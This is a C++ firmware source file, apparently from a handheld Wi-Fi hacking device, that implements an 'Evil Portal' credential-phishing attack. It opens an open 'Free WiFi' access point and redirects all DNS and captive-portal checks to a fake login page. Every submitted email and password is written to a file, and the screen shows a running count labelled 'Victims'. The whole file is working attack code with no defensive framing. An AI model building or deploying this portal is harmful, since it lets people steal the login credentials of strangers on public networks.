// pid PID::EVIL_PORTAL

#include <LittleFS.h>

const char* EVIL_PORTAL_SSID = "Free WiFi";
const char* EVIL_PORTAL_CREDS_FILE = "/evil_portal_creds.txt";
IPAddress EVIL_PORTAL_GATEWAY(172, 0, 0, 1);
IPAddress EVIL_PORTAL_SUBNET(255, 255, 255, 0);
int evilPortalVictimCount = 0;

void evilPortalSaveCreds(String email, String password) {
	if (!lfsBegin()) return;

	File f = LittleFS.open(EVIL_PORTAL_CREDS_FILE, FILE_APPEND);
	if (!f) {
		// try create new
		f = LittleFS.open(EVIL_PORTAL_CREDS_FILE, FILE_WRITE);
		if (!f) return;
	}

	DeviceTime dt = deviceGetTime();
	char timeBuf[16];
	snprintf(timeBuf, sizeof(timeBuf), "%02d:%02d:%02d", dt.hours, dt.minutes, dt.seconds);

	String entry = String(timeBuf) + " | " + email + " | " + password + "\n";
	f.print(entry);
	f.close();

	evilPortalVictimCount++;
	soundSuccess();

	Serial.println("Evil Portal: captured " + email);
}

// Shared captive portal detection endpoints
static void _evilPortalRegisterCaptiveEndpoints() {
	webServer.on("/generate_204", []() {
		webServer.sendHeader("Location", "http://" + EVIL_PORTAL_GATEWAY.toString() + "/", true);
		webServer.send(302, "text/plain", "");
	});
	webServer.on("/hotspot-detect.html", []() {
		webServer.sendHeader("Location", "http://" + EVIL_PORTAL_GATEWAY.toString() + "/", true);
		webServer.send(302, "text/plain", "");
	});
	webServer.on("/library/test/success.html", []() {
		webServer.sendHeader("Location", "http://" + EVIL_PORTAL_GATEWAY.toString() + "/", true);
		webServer.send(302, "text/plain", "");
	});
	webServer.on("/success.txt", []() {
		webServer.send(200, "text/plain", "success");
	});
	webServer.on("/ncsi.txt", []() {
		webServer.send(200, "text/plain", "Microsoft NCSI");
	});
	webServer.on("/connecttest.txt", []() {
		webServer.send(200, "text/plain", "Microsoft Connect Test");
	});
	webServer.on("/redirect", []() {
		webServer.sendHeader("Location", "http://" + EVIL_PORTAL_GATEWAY.toString() + "/", true);
		webServer.send(302, "text/plain", "");
	});
	webServer.on("/canonical.html", []() {
		webServer.sendHeader("Location", "http://" + EVIL_PORTAL_GATEWAY.toString() + "/", true);
		webServer.send(302, "text/plain", "");
	});
}

// Login handler - shared by both modes
static void _evilPortalRegisterLogin() {
	webServer.on("/login", []() {
		if (webServer.method() == HTTP_POST) {
			String email = webServer.arg("email");
			String password = webServer.arg("password");
			if (email.length() > 0 && password.length() > 0) {
				evilPortalSaveCreds(email, password);
			}
			webServer.send(200, "text/html", evilPortalSuccessHTML());
		} else {
			webServer.sendHeader("Location", "/", true);
			webServer.send(302, "text/plain", "");
		}
	});
}

static void _evilPortalServeFsFile(const String& uri, const String& htmlPath, bool useSd) {
	String path = uri;
	if (path == "/") path = htmlPath;
	File f;
	f = useSd ? SD.open(path) : LittleFS.open(path);
	if (f) {
		webServer.streamFile(f, getContentType(path));
		f.close();
	} else {
		webServer.sendHeader("Location", "http://" + EVIL_PORTAL_GATEWAY.toString() + "/", true);
		webServer.send(302, "text/plain", "");
	}
}

void evilPortalLoop() {
	static bool webServerDone = false;

	if (isSetup()) {
		webServerDone = false;

		if (webServerFs && selectedFilePath == "") {
			filePickerSetup(PID::WIFI);
		}
	}

	// File picker phase
	if (fpActive) {
		if (filePickerLoop()) return;
		if (selectedFilePath == "") return; // cancelled - back to PID::WIFI
		// file selected - fall through to web server setup
	}

	if (webServerFs && selectedFilePath == "") return; // still waiting for picker

	// Web server setup (runs once)
	if (!webServerDone) {
		// AP + DNS
		WiFi.mode(WIFI_AP);
		WiFi.softAP(EVIL_PORTAL_SSID, nullptr); // open network
		WiFi.softAPConfig(EVIL_PORTAL_GATEWAY, EVIL_PORTAL_GATEWAY, EVIL_PORTAL_SUBNET);
		dnsServer.start(53, "*", EVIL_PORTAL_GATEWAY);

		_evilPortalRegisterCaptiveEndpoints();
		_evilPortalRegisterLogin();

		if (!webServerFs) {
			// Hardcoded HTML mode
			webServer.on("/", []() {
				webServer.send(200, "text/html", evilPortalHTML());
			});
			webServer.onNotFound([]() {
				webServer.sendHeader("Location", "http://" + EVIL_PORTAL_GATEWAY.toString() + "/", true);
				webServer.send(302, "text/plain", "");
			});
		} else {
			// FS mode - serve from SD or LittleFS
			String htmlPath = selectedFilePath;
			bool useSd = fpSelectedSd;

			webServer.on("/", [htmlPath, useSd]() {
				_evilPortalServeFsFile("/", htmlPath, useSd);
			});
			webServer.onNotFound([htmlPath, useSd]() {
				_evilPortalServeFsFile(webServer.uri(), htmlPath, useSd);
			});
		}

		webServer.begin();
		webServerDone = true;
		isWebInterfaceEnabled = true;
		evilPortalVictimCount = 0;

		String ssidLabel = webServerFs ? selectedFilePath : String(EVIL_PORTAL_SSID);
		String lines[] = {
			L->TXT_WIFI_EVIL_PORTAL_RUNNING,
			webServerFs ? "FS: " + ssidLabel : "SSID: " + ssidLabel,
			"Victims: " + String(evilPortalVictimCount),
			String(EVIL_PORTAL_CREDS_FILE)
		};
		centeredPrintRows(lines, 4, SMALL_TEXT);
	}

	dnsServer.processNextRequest();
	webServer.handleClient();

	// Update victim counter on screen
	static int lastVictimCount = 0;
	if (evilPortalVictimCount != lastVictimCount) {
		lastVictimCount = evilPortalVictimCount;
		String ssidLabel = webServerFs ? selectedFilePath : String(EVIL_PORTAL_SSID);
		String lines[] = {
			L->TXT_WIFI_EVIL_PORTAL_RUNNING,
			webServerFs ? "FS: " + ssidLabel : "SSID: " + ssidLabel,
			"Victims: " + String(evilPortalVictimCount),
			String(EVIL_PORTAL_CREDS_FILE)
		};
		centeredPrintRows(lines, 4, SMALL_TEXT);
	}

	if (checkExit()) {
		selectedFilePath = "";
		fpActive = false;
		webServerDone = false;
	}
}
